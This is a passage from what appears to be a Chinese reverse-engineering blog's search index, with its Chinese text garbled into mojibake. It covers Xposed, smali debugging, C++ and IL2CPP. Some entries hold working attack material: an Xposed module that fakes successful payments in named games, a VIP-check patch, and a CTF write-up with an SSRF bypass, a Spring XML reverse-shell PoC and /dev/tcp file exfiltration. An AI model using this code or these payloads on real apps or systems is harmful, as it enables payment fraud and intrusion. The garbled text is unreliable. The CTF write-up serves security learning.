b9bf0a6153d0120f3d5a72403d994de1401a831a8090922d0be2cd46af7a4689abeb5a988644ca5dcaa00f5f3db453ac8dd980dab6f3193aa15613e8afb1cd88d692102974e91036b1ec7b877b4a031f1f0708d2a1e1951dd5335888dfca526b54a9e7de","link":"/2020/09/10/%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"title":"è®°å½•å‡ ä¸ªvscodeå¸¸ç”¨å¿«æ·é”®","text":"markdownlint é¢„è§ˆå¿«æ·é”® Ctrl+Shilt+V PicGoï¼ˆå¾ˆæ£’çš„å›¾åºŠæ’ä»¶ï¼‰ ä»å‰ªåˆ‡æ¿ä¸Šä¼ å›¾ç‰‡ï¼šCtrl + Alt + U ä»æœ¬åœ°æ–‡ä»¶å¤¹ä¸Šä¼ å›¾ç‰‡ï¼šCtrl + Alt + E ä»è¾“å…¥æ¡†ä¸Šä¼ å›¾ç‰‡ï¼šCtrl + Alt + O","link":"/2020/09/10/%E8%AE%B0%E5%BD%95%E5%87%A0%E4%B8%AAvscode%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"title":"é©±åŠ¨å†…æ ¸å¸¸ç”¨api","text":"Api PsLookupProcessByProcessId æ ¹æ®ProcessIdè·å–EProcessç»“æ„ä½“ ObDereferenceObject(PEProcess) è§£å¼•ç”¨ï¼Œä¿®æ”¹eprocessçš„å¼•ç”¨ä¸º0","link":"/2020/08/26/%E9%A9%B1%E5%8A%A8%E5%86%85%E6%A0%B8%E5%B8%B8%E7%94%A8api/"},{"title":"Android Killer ä¸åç¼–è¯‘èµ„æº","text":"Android Killer ä¸åç¼–è¯‘èµ„æº","link":"/2021/04/07/Android/AndroidKiller%E4%B8%8D%E5%8F%8D%E7%BC%96%E8%AF%91%E8%B5%84%E6%BA%90/"},{"title":"xposed åŸç†åˆæ¢","text":"ä¸€ã€Xposed æ¡†æ¶å®ç° Hook çš„åŸç†ä»‹ç»Zygoteæ˜¯Androidçš„æ ¸å¿ƒï¼Œæ¯è¿è¡Œä¸€ä¸ªappï¼ŒZygoteå°±ä¼šforkä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹æ¥è¿è¡Œappï¼ŒXposed Frameworkæ·±å…¥åˆ°äº†Androidæ ¸å¿ƒæœºåˆ¶ä¸­ï¼Œé€šè¿‡æ”¹é€ Zygoteæ¥å®ç°ä¸€äº›å¾ˆç‰›é€¼çš„åŠŸèƒ½ã€‚Zygoteçš„å¯åŠ¨é…ç½®åœ¨init.rc è„š æœ¬ ä¸­ï¼Œç”±ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™å¼€å¯æ­¤è¿›ç¨‹ï¼Œå¯¹åº”çš„æ‰§è¡Œæ–‡ä»¶æ˜¯/system/bin/app_processï¼Œè¿™ä¸ªæ–‡ä»¶å®Œæˆç±»åº“åŠ è½½åŠä¸€äº›å‡½æ•°è°ƒç”¨çš„å·¥ä½œã€‚å½“ç³»ç»Ÿä¸­å®‰è£…äº†Xposed Frameworkä¹‹åï¼Œä¼šå¯¹app_processè¿›è¡Œæ‰©å±•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒXposedFramework ä¼šæ‹¿è‡ªå·±å®ç°çš„app_processè¦†ç›–æ‰AndroidåŸç”Ÿæä¾›çš„app_processæ–‡ä»¶ï¼Œå½“ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ï¼Œå°±ä¼šåŠ è½½ç”± Xposed Framework æ›¿æ¢è¿‡çš„è¿›ç¨‹æ–‡ä»¶ï¼Œå¹¶ä¸”ï¼ŒXposedFramework è¿˜å®šä¹‰äº†ä¸€ä¸ª jar åŒ…ï¼Œç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ï¼Œä¹Ÿä¼šåŠ è½½è¿™ä¸ªåŒ…ï¼š/data/data/de.robv.android.xposed.installer/bin/XposedBridge.jar äºŒã€Xposedæ¡†æ¶è¿è¡Œçš„æ¡ä»¶1.Rooted Device / Emulator ï¼ˆå·²rootçš„æ‰‹æœºæˆ–è€…æ¨¡æ‹Ÿå™¨ï¼‰2.Xposed Installer (Xposedå®‰è£…ç¨‹åºä¸‹è½½)3.Hooking Android App ï¼ˆè¦è¢«Hookçš„ç›®æ ‡ Appï¼‰ Xposed Frameworkå°±æ˜¯ä¸€ä¸ªapkåŒ…ä¹Ÿå°±æ˜¯ä¸Šé¢ä¸‹è½½çš„Xposedå®‰è£…ç¨‹åºï¼Œä¸‹è½½åç”¨ä¸‹é¢çš„å‘½ä»¤å®‰è£…åˆ°æ‰‹æœºä¸Šæˆ–è€…æ¨¡æ‹Ÿå™¨ï¼šadb install de.robv.android.xposed.installer_v32_de4f0d.apk appframeworkC++linuxå†…æ ¸ linuxå†…æ ¸ â€“&gt; init â€“&gt; app_process â€“&gt; Zygote Zygoteè¿›ç¨‹åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œé™¤äº†åˆ›å»ºä¸€ä¸ªDalvikè™šæ‹Ÿæœºå®ä¾‹ä¹‹å¤–ï¼Œè¿˜ä¼šå°†Javaè¿è¡Œæ—¶åº“åŠ è½½åˆ°è¿›ç¨‹ä¸­æ¥ï¼ŒåŒæ—¶è¿˜ä¼šæ³¨å†Œä¸€äº›Androidæ ¸å¿ƒç±»çš„JNIæ–¹æ³•åˆ°å‰é¢åˆ›å»ºçš„Dalvikè™šæ‹Ÿæœºå®ä¾‹ä¸­å»ã€‚ ä¸€ä¸ªåº”ç”¨ç¨‹åºè¢«å­µåŒ–å‡ºæ¥çš„æ—¶å€™ï¼Œå…¶ä¸ä»…ä¼šè·å¾—Zygoteè¿›ç¨‹ä¸­çš„Dalvikè™šæ‹Ÿæœºå®ä¾‹ï¼Œè¿˜ä¼šä¸Zygoteä¸€èµ·å…±äº«Javaè¿è¡Œæ—¶åº“ï¼Œè¿™ä¹Ÿæ˜¯å¯ä»¥å°†XposedBridge.jarè¿™ä¸ªjaråŒ…åŠ è½½åˆ°æ¯ä¸€ä¸ªAndroidåº”ç”¨ä¸­çš„åŸå› ã€‚ Xposed_zygoteè¿›ç¨‹å¯åŠ¨åä¼šåˆå§‹åŒ–ä¸€äº›soæ–‡ä»¶ï¼ˆ/system/libã€/system/lib64ï¼‰ï¼Œç„¶åè¿›å…¥XposedBridge.jarä¸­çš„XposedBridge.mainä¸­åŠ è½½æ¨¡å—ï¼Œåˆå§‹åŒ–jaråŒ…å®Œæˆå¯¹ä¸€äº›å…³é”®Androidç³»ç»Ÿå‡½æ•°çš„hookã€‚ Hookåˆ™æ˜¯åˆ©ç”¨ä¿®æ”¹è¿‡çš„è™šæ‹Ÿæœºå°†å‡½æ•°æ³¨å†Œä¸ºnativeå‡½æ•°ã€‚ç„¶åå†è¿”å›zygoteä¸­å®ŒæˆåŸæœ¬zygoteéœ€è¦åšçš„å·¥ä½œã€‚ META-INF/ é‡Œé¢æœ‰æ–‡ä»¶é…ç½®è„šæœ¬ flash-script.sh é…ç½®å„ä¸ªæ–‡ä»¶å®‰è£…ä½ç½®ã€‚system/bin/ æ›¿æ¢zygoteè¿›ç¨‹ç­‰æ–‡ä»¶system/framework/XposedBridge.jar jaråŒ…ä½ç½®system/lib system/lib64 ä¸€äº›soæ–‡ä»¶æ‰€åœ¨ä½ç½®xposed.prop xposedç‰ˆæœ¬è¯´æ˜æ–‡ä»¶ Androidhttps://developer.android.google.cn/ SDKåˆ·æœºåŒ…ä¸‹è½½x86ï¼šhttps://dl-xda.xposed.info/framework/x86_64ï¼šhttps://github.com/youling257/XposedTools/files/1931996/xposed-x86_64.zip VirtualApphttps://github.com/asLody/VirtualApp Android HookæŠ€æœ¯é˜²èŒƒæ¼«è°ˆhttps://tech.meituan.com/android_anti_hooking.html XPOSEDé­”æ”¹ä¸€https://bbs.pediy.com/thread-258639.htm ä¼ä¸šå£³åè°ƒè¯•åŠhookæ£€æµ‹åˆ†æhttps://mp.weixin.qq.com/s/StnqWtZMFCu09snIEGi1RQ ç ´è§£æŸæ”¯ä»˜è½¯ä»¶é˜²Xposedç­‰æ¡†æ¶HookåŠŸèƒ½æ£€æµ‹æœºåˆ¶https://mp.weixin.qq.com/s/Je1kRksxHTTYb4l9x3bTmQ é˜¿é‡Œç³»äº§å“Xposed Hookæ£€æµ‹æœºåˆ¶åŸç†åˆ†æhttps://bbs.pediy.com/thread-218848.htm æŠ–éŸ³çŸ­è§†é¢‘æ£€æµ‹ Xposed åˆ†æï¼ˆä¸€ï¼‰https://www.52pojie.cn/thread-684757-1-1.html æŠ–éŸ³çŸ­è§†é¢‘æ£€æµ‹ Xposed åˆ†æï¼ˆäºŒï¼‰https://www.52pojie.cn/thread-691584-1-1.html QQ æµè§ˆå™¨ ä¸­çš„Hook,Root,æ¨¡æ‹Ÿå™¨,Debug,DexFileæ£€æµ‹æŠ€æœ¯https://bbs.pediy.com/thread-250871.htm æ£€æµ‹Androidè™šæ‹Ÿæœºçš„æ–¹æ³•å’Œä»£ç å®ç°https://mp.weixin.qq.com/s/tamMeh2xsi6L37jjizW_rA","link":"/2021/04/07/Android/Xposed%E5%8E%9F%E7%90%86%E5%88%9D%E6%8E%A2/"},{"title":"AndroidStudioè°ƒè¯•smaliä»£ç ","text":"æ‰€éœ€æ’ä»¶Android Studio 4.0åŠä»¥ä¸Šéœ€è¦smalidea-0.06æ’ä»¶Android Studio 4.0ä»¥ä¸‹éœ€è¦smalidea-0.05æ’ä»¶å®‰è£…æ’ä»¶æµç¨‹ è·å–åˆ°å¯¹åº”çš„smalideaæ’ä»¶åŒ… (https://bitbucket.org/JesusFreke/smalidea/downloads/) é€‰æ‹©AndroidStudioå·¦ä¸Šè§’File -&gt; Settings -&gt; Plugins -&gt; é½¿è½®å›¾æ ‡ -&gt; Install Plugin from Disk -&gt; é€‰æ‹©æ’ä»¶åŒ…ï¼ˆä¸éœ€è¦è§£å‹ï¼‰ ä¿å­˜å¹¶é‡å¯IDEAå³å¯ æ³¨æ„äº‹é¡¹smaliä»£ç è°ƒè¯•ä¸èƒ½å¼€å¯ddmsï¼ˆå¼€å¯ddmsä¼šå ç”¨ç«¯å£ï¼‰éœ€è¦å¼€å¯ç³»ç»Ÿè°ƒè¯•å¼€å…³æˆ–è€…ä¿®æ”¹é…ç½®æ–‡ä»¶æ·»åŠ android:debuggable=â€trueâ€ (æ¨¡æ‹Ÿå™¨é»˜è®¤éƒ½æ˜¯å¼€å¯ç³»ç»Ÿè°ƒè¯•å¼€å…³çš„,xposed+bdopenreræ’ä»¶å¯ä»¥è®¾ç½®ç³»ç»Ÿè°ƒè¯•å¼€å…³)ç«¯å£å ç”¨é—®é¢˜ ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”µè„‘ç«¯æŸä¸ªç¨‹åºå ç”¨äº†è°ƒè¯•ç«¯å£8700æ“ä½œæµç¨‹ è·å–APKçš„smaliæ–‡ä»¶ å¯ä»¥ä½¿ç”¨ androidkilleråç¼–è¯‘ AndroidStudioæ‰“å¼€å·²å­˜åœ¨å·¥ç¨‹é€‰æ‹©è·å–åˆ°çš„smaliæ–‡ä»¶å¤¹ è®¾ç½®é¡¹ç›®å±æ€§ï¼šå³å‡»é¡¹ç›® -&gt; Mark Directory as -&gt; Sources Root é…ç½®è°ƒè¯•å±æ€§ï¼š -&gt; Run -&gt; Edit Configurations -&gt; add -&gt; remote å‘½ä»¤è¡Œå¯åŠ¨è°ƒè¯•æ¨¡å¼ adb shell am start -D -n packagename/.MainActivity æŸ¥çœ‹è¿›ç¨‹ID ps |grep packagename é…ç½®ç«¯å£è½¬å‘ï¼šadb forward tcp:8700 jdwp:pid åç§°ï¼šPingAn1åŒ…åï¼šcom.testjava.jack.pingan1å…¥å£ï¼šcom.testjava.jack.pingan1.MainActivityç‰ˆæœ¬ä¿¡æ¯ï¼šVerï¼š1.0(1) SDKï¼š19 TargetSDKï¼š26 Activityï¼š com.testjava.jack.pingan1.MainActivity Receiverï¼š Serviceï¼š Permissionï¼š https://www.jianshu.com/p/c9a7debfbf91","link":"/2021/04/07/Android/AndroidStudio%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"},{"title":"pdfé’“é±¼æ ·æœ¬åˆ†æ","text":"æŸ¥çœ‹å½“å‰è¿æ¥è®¾å¤‡adb devices æŸ¥çœ‹æ—¥å¿—adb logcat å®‰è£…apkæ–‡ä»¶adb install xxx.apk å¸è½½Appadb uninstall com.zhy.app è¿›å…¥å‘½ä»¤è¡Œadb shell æŸ¥çœ‹å½“å‰æ´»åŠ¨ç•Œé¢ä¿¡æ¯adb shell dumpsys activity top |findstr pid","link":"/2020/08/26/Android/adb%20%E5%91%BD%E4%BB%A4/"},{"title":"jebè°ƒè¯•smaliä»£ç ","text":"ä¼˜ç‚¹ç¼ºç‚¹è°ƒè¯•å¤§å‹APPå®¹æ˜“å´©ï¼Œå‡ºé”™æ˜¾ç¤ºsmaliä»£ç å’Œapktoolåç¼–è¯‘åçš„ä¸ä¸€æ · æµç¨‹ æŠŠè¦è°ƒè¯•çš„APPæ‹–å…¥åˆ°jebå·¥å…·ä¸­ è°ƒè¯•å™¨APPï¼Œå…ˆæ‰“æ–­ç‚¹","link":"/2021/04/07/Android/jeb%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"},{"title":"xposed å°å®æˆ˜","text":"ç»å…¸è´ªåƒè›‡å¤§ä½œæˆ˜å…³é”®å­—ç¬¦ä¸²ï¼šæ”¯ä»˜å–æ¶ˆ 1234567891011121314151617181920//zombie.class 11,Lcom/qy/zombie/zombie;-&gt;DX_Pay(Ljava/util/HashMap;)V+4h,,public static void DX_Pay(HashMap arg3) { new AlertDialog$Builder(zombie.activity); EgamePay.pay(zombie.activity, ((Map)arg3), new EgamePayListener() { public void payCancel(Map arg4) { Toast.makeText(zombie.activity, &quot;æ”¯ä»˜å–æ¶ˆ&quot;, 0).show(); zombie.BuyFailed(); } public void payFailed(Map arg4, int arg5) { Toast.makeText(zombie.activity, &quot;æ”¯ä»˜å¤±è´¥&quot; + arg5, 0).show(); zombie.BuyFailed(); } public void paySuccess(Map arg4) { Toast.makeText(zombie.activity, &quot;æ”¯ä»˜æˆåŠŸ&quot;, 0).show(); zombie.BuySccess(); } });} é€»è¾‘ï¼špayCancel å‡½æ•° payFailed å‡½æ•° éƒ½æ¢æˆ paySuccessé€šè¿‡androidkillerå‘ç° è¿™å‡ ä¸ªå‡½æ•°åœ¨ç±»ï¼šcom/qy/zombie/zombie$3 ä¸‹ å•æœºæ–—åœ°ä¸»æ”¯ä»˜å®è´­ä¹°å…³é”®å­—ï¼š 9000 ï¼ˆ0x2328ï¼‰å…¨å±€æœç´¢ 123456789101112131415161718192021222324252627282930313233343536//com/alipay/sdk/app/j public static j a(int arg1) { j v0; switch(arg1) { case 4001: { v0 = j.e; break; } case 5000: { v0 = j.f; break; } case 6001: { v0 = j.c; break; } case 6002: { v0 = j.d; break; } case 8000: { v0 = j.g; break; } case 9000: { v0 = j.a; break; } default: { v0 = j.b; break; } } return v0; } ä¿®æ”¹æ­¤å‡½æ•°çš„å‚æ•°ä¸º9000 è¡—æœºæ•é±¼è¾¾äºº åŒä¸Š com/alipay/sdk/app/i // ä»£ç ï¼š package com.example.xposedplugin; import android.os.Message; import java.util.Map; import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XC_MethodReplacement;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage; public class XposedInit implements IXposedHookLoadPackage { @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable { XposedBridge.log(â€œå½“å‰å¯åŠ¨çš„åº”ç”¨ç¨‹åºæ˜¯ï¼šâ€+loadPackageParam.packageName); if(loadPackageParam.packageName.equals(&quot;com.yunhaoge.tanchishe.egame&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.qy.zombie.zombie$3&quot;, loadPackageParam.classLoader, &quot;payCancel&quot;, Map.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { XposedHelpers.callMethod(methodHookParam.thisObject,&quot;paySuccess&quot;,methodHookParam.args); return null; } }); XposedHelpers.findAndHookMethod(&quot;com.qy.zombie.zombie$3&quot;, loadPackageParam.classLoader, &quot;payFailed&quot;, Map.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { XposedHelpers.callMethod(methodHookParam.thisObject,&quot;paySuccess&quot;,methodHookParam.args); return null; } }); } if (loadPackageParam.packageName.equals(&quot;com.june.game.doudizhu&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.alipay.sdk.app.j&quot;, loadPackageParam.classLoader, &quot;a&quot;, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); XposedBridge.log(&quot;Strå‚æ•°ï¼š&quot; + param.args[0]); param.args[0] = 9000; XposedBridge.log(&quot;ä¿®æ”¹åå‚æ•°ï¼š&quot;+param.args[0]); } }); } if (loadPackageParam.packageName.equals(&quot;com.prgame5.fish2.baidu&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.alipay.sdk.app.i&quot;, loadPackageParam.classLoader, &quot;a&quot;, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); XposedBridge.log(&quot;Strå‚æ•°ï¼š&quot; + param.args[0]); param.args[0] = 9000; XposedBridge.log(&quot;ä¿®æ”¹åå‚æ•°ï¼š&quot;+param.args[0]); } }); } } }","link":"/2021/04/07/Android/xposed%E6%A1%86%E6%9E%B6%E8%80%83%E8%AF%95/"},{"title":"å®‰å“ç ´è§£å®æˆ˜ - ä¿®æ”¹é‡ç¼–è¯‘","text":"é€šè¿‡ UI Automator Viewerå·¥å…·æ‰¾åˆ°æäº¤æŒ‰é’®ID é€šè¿‡IDæ‰¾åˆ°ç•Œé¢ æ‰¾åˆ°ç•Œé¢è°ƒç”¨ä½ç½® å‘ç°ä¸€ä¸ªå‡½æ•°è°ƒç”¨äº†è¿™ä¸ªç•Œé¢ï¼Œç›´æ¥returnæ‰å‡½æ•° å…¨å±€æœç´¢isVip æ‰¾åˆ°åˆ¤æ–­ä¿®æ”¹çŠ¶æ€ ç›´æ¥ return true ä¿®æ”¹getIsVip = 1","link":"/2021/04/07/Android/%E8%80%83%E9%A2%98/"},{"title":"","text":"å‚æ•°æ•°é‡ä¸å®šçš„æ¨¡æ¿ Varuaduc Templates 1234567891011121314151617void print(){}template&lt;typename T,typename... Types&gt; // æ¥å— 1+nä¸ªå‚æ•°void print(const T&amp; firstArg,const Types&amp;... args){ count &lt;&lt; firstArg &lt;&lt; endl; // æ‰“å°ç¬¬ä¸€ä¸ª print(args...); // é€’å½’è°ƒç”¨ å½“argsæ•°é‡æ˜¯0çš„æ—¶å€™ å°±ä¼šè°ƒç”¨ç©ºå‚æ•°çš„printå‡½æ•°}template&lt;typename... Types&gt; // æ¥å— nä¸ªå‚æ•°void print(const Types&amp;... args){}","link":"/2021/07/10/C++/Templates%E6%A8%A1%E6%9D%BF/"},{"title":"2020-kcft-ç§‹å­£èµ›-1.è‡³æš—æ—¶åˆ»WP","text":"2020-kcft-ç§‹å­£èµ›-è‡³æš—æ—¶åˆ»WP - å¸ƒå¢¨ ç›¸è¯† http://121.36.145.157:8088/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg http://121.36.145.157:8088/loadConfig?url=x.xml ç›¸çŸ¥ é“¾æ¥1 ç»æµ‹è¯•ä¼šåŠ è½½urlå‚æ•°çš„åœ°å€ é“¾æ¥2 è¿”å›not allow ip çŒœæµ‹éœ€è¦è¿‡è¿™ä¸ªipæ ¡éªŒå‘ç°ç¬¬ä¸€ä¸ªé“¾æ¥ä¼šæ ¡éªŒurlå‚æ•°çš„æ ¼å¼^(http|https):\\/\\/[^?#\\/]\\.pediy\\.com\\/.ç»•è¿‡æ­£åˆ™ï¼š http://121.36.145.157:8088/getimage?url=http://localhost%253a8088%253f.pediy.com/ http://localhost:8080?.pediy.com/ localhost:8080? ä¿©æ¬¡urlç¼–ç  ï¼ˆæµè§ˆå™¨è¯·æ±‚çš„æ—¶å€™é»˜è®¤å°±æ˜¯ä¸€æ¬¡urlç¼–ç ï¼ŒæœåŠ¡å™¨æ”¶åˆ°ä¼šè§£ç ä¸€æ¬¡ æ‰€ä»¥éœ€è¦ä¿©æ¬¡ ç›¸æ€ javaå†™çš„æœåŠ¡ï¼Œç„¶åæœ‰ä¸ªFileSystemXmlApplicationContextçŒœæµ‹æ˜¯CVE-2019-2725çš„æ´ æ„å»ºpocåå¼¹shell é“¾æ¥ä¸Šä¹‹åæ‹¿åˆ°.jaræ–‡ä»¶ åç¼–è¯‘å³å¯ POC 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg &gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/127.0.0.1/9090 0&gt;&amp;1]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; é‡åˆ°çš„é—®é¢˜ æ€ä¹ˆä»é¶æœºä¸­ä¸‹è½½æ–‡ä»¶ ä¸»æœºï¼šnc -lvnp prot &gt; 1.jar é¶æœºï¼šcat x.jar&gt;/dev/tcp/ip/prot å‡ºé¢˜å½“å¤©æ™šä¸Šæˆ‘æ›¾ç”¨pocé“¾æ¥ä¸Š åæ¥æ–­äº† é‚£å¤©æ™šä¸Šå°±ä¸€ç›´è¿æ¥ä¸ä¸Šäº†ã€‚ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œç¬¬äºŒå¤©è«åå…¶å¦™çš„å¯ä»¥äº†ã€‚ã€‚ã€‚ å‚è€ƒæ–‡ç« :CVE-2019-2725 äºŒæ¬¡ååºåˆ—åŒ–FileSystemXmlApplicationContext Gadget POC","link":"/2020/11/18/CTF/2020-kcft-%E7%A7%8B%E5%AD%A3%E8%B5%9B-1-%E8%87%B3%E6%9A%97%E6%97%B6%E5%88%BBWP/"},{"title":"LLVMç¼–è¯‘","text":"æ‹‰å»llvmæºç git clone llvmsource cmakeå®‰è£…å®˜ç½‘ä¸‹è½½cmake https://cmake.org/download/ æ–°å»ºbuildæ–‡ä»¶å¤¹ï¼Œè¿›å»ä¹‹åcmake ../12cd buildcmake ../","link":"/2021/04/07/LLVM/llvm%20build/"},{"title":"linux configureè°ƒè¯•æ¨¡å¼","text":"#!/bin/sh./bootstrap.sh./configure â€“enable-debug â€“disable-shared â€“enable-staticmake","link":"/2021/04/07/linux/linux%20configure%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/"},{"title":"ä»£ç ç”Ÿæˆä¹‹æ—…","text":"ä»£ç ç”Ÿæˆä¹‹æ—…æ‰˜ç®¡ä»£ç å¦‚ä½•æ˜ å°„åˆ°C++ä»£ç åœ¨æ‰˜ç®¡ä»£ç ä¸­çš„æ¯ä¸ªç±»ï¼Œil2cpp.exeéƒ½ä¼šç›¸åº”çš„ç”Ÿæˆä¸€ä¸ªæœ‰ç€C++å®šä¹‰çš„å¤´æ–‡ä»¶å’Œå¦å¤–ä¸€ä¸ªè¿›è¡Œå‡½æ•°å£°æ˜çš„å¤´æ–‡ä»¶ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹UnityEngine.Vector3æ˜¯å¦‚ä½•è¢«è½¬æ¢çš„ã€‚è¿™ä¸ªç±»çš„å¤´æ–‡ä»¶åå­—å«UnityEngine_UnityEngine_Vector3.hã€‚å¤´æ–‡ä»¶åçš„ç»„æˆï¼šä¸€å¼€å§‹æ˜¯ç¨‹åºé›†åç§°ï¼ˆè¿™é‡Œæ˜¯UnityEngineï¼‰ï¼Œç„¶åè·Ÿç€å‘½åç©ºé—´ï¼ˆè¿˜æ˜¯UnityEngineï¼‰ï¼Œæœ€åæ˜¯è¿™ä¸ªç±»å‹çš„åå­—ï¼ˆVector3ï¼‰ã€‚å¤´æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 1234567891011// UnityEngine.Vector3struct Vector3_t78{ // System.Single UnityEngine.Vector3::x float ___x_1; // System.Single UnityEngine.Vector3::y float ___y_2; // System.Single UnityEngine.Vector3::z float ___z_3;}; il2cpp.exeå¯¹Vector3ä¸­ä¸‰ä¸ªæˆå‘˜éƒ½è¿›è¡Œäº†è½¬æ¢ï¼Œå¹¶ä¸”é€‚å½“çš„å¤„ç†äº†ä¸‹å˜é‡åå­—ï¼ˆåœ¨æˆå‘˜å˜é‡å‰é¢æ·»åŠ ä¸‹åˆ’çº¿ï¼‰ä»¥é¿å…å’Œä¿ç•™å­—å†²çªã€‚ UnityEngine_UnityEngine_Vector3MethodDeclarations.hå¤´æ–‡ä»¶ä¸­åˆ™åŒ…å«äº†Vector3è¿™ä¸ªç±»ä¸­æ‰€æœ‰ç›¸å…³çš„å‡½æ•°ã€‚æ¯”å¦‚æˆ‘ä»¬ç†Ÿæ‚‰çš„ToStringå‡½æ•°ï¼š 12// System.String UnityEngine.Vector3::ToString()extern &quot;C&quot; String_t* Vector3_ToString_m2315 (Vector3_t78 * __this, MethodInfo* method) IL2CPP_METHOD_ATTR è¯·å¤§å®¶æ³¨æ„å‡½æ•°å‰é¢çš„æ³¨é‡Šï¼Œå®ƒèƒ½å¾ˆå¥½çš„ååº”å‡ºè¿™ä¸ªå‡½æ•°åœ¨åŸæœ¬æ‰˜ç®¡ä»£ç ä¸­çš„åç§°ã€‚æˆ‘æ—¶å¸¸å‘ç°è¿™äº›ä¸ªæ³¨é‡Šéå¸¸æœ‰ç”¨ï¼Œèƒ½è®©æˆ‘åœ¨C++ä»£ç ä¸­å¿«é€Ÿå®šä½æˆ‘æƒ³è¦å¯»æ‰¾çš„å‡½æ•°ã€‚ ç”±il2cpp.exeç”Ÿæˆçš„å‡½æ•°ä»£ç æœ‰ç€ä»¥ä¸‹ä¸€äº›æœ‰è¶£çš„ç‰¹æ€§ï¼š æ‰€æœ‰çš„å‡½æ•°éƒ½ä¸æ˜¯æˆå‘˜å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œéƒ½æ˜¯â€œthisâ€æŒ‡é’ˆã€‚å¯¹äºæ‰˜ç®¡ä»£ç ä¸­çš„é™æ€å‡½æ•°è€Œè¨€ï¼ŒIL2CPPä¼šä¼ é€’NULLä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼ã€‚è¿™ä¹ˆåšçš„å¥½å¤„æ˜¯å¯ä»¥è®©il2cpp.exeè½¬æ¢ä»£ç çš„é€»è¾‘æ›´åŠ ç®€å•å¹¶ä¸”è®©ä»£ç†å‡½æ•°çš„å¤„ç†å˜å¾—æ›´åŠ å®¹æ˜“ã€‚ æ‰€æœ‰çš„å‡½æ•°è¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„MethodInfo*å‚æ•°ç”¨æ¥æè¿°å‡½æ•°çš„å…ƒä¿¡æ¯ã€‚è¿™äº›å…ƒä¿¡æ¯æ˜¯è™šå‡½æ•°è°ƒç”¨çš„å…³é”®ã€‚Monoä½¿ç”¨å’Œç‰¹å®šå¹³å°ç›¸å…³çš„æ–¹æ³•æ¥ä¼ é€’è¿™äº›å…ƒä¿¡æ¯ã€‚è€ŒIL2CPPå‡ºäºå¯ç§»æ¤æ–¹é¢çš„è€ƒè™‘ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨è¿™äº›å’Œå¹³å°ç›¸å…³çš„ç‰¹å®šä»£ç ã€‚æ‰€æœ‰çš„å‡½æ•°éƒ½è¢«å£°æ˜æˆäº†extern â€œCâ€ï¼Œè¿™æ ·ä¸€æ¥ï¼Œåœ¨éœ€è¦çš„æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥éª—è¿‡C++ç¼–è¯‘å™¨è®©å…¶è®¤ä¸ºæ‰€æœ‰è¿™äº›å‡½æ•°éƒ½æ˜¯ä¸€ä¸ªç±»å‹ã€‚ æ‰˜ç®¡å‡½æ•°ä¸­çš„ç±»å‹ä¼šè¢«åŠ ä¸Šâ€œ_tâ€çš„åç¼€ï¼Œå‡½æ•°åˆ™æ˜¯åŠ ä¸Šâ€œ_mâ€åç¼€ã€‚æœ€åæˆ‘ä»¬åŠ ä¸Šä¸€ä¸ªå”¯ä¸€çš„æ•°å­—æ¥é¿å…åå­—çš„é‡å¤ã€‚è¿™äº›æ•°å­—ä¼šéšç€é¡¹ç›®ä»£ç çš„æ”¹å˜è€Œæ”¹å˜ï¼Œå› æ­¤ä½ ä¸èƒ½æŠŠæ•°å­—ä½œä¸ºç´¢å¼•æˆ–è€…åˆ†æçš„å‚ç…§ã€‚ 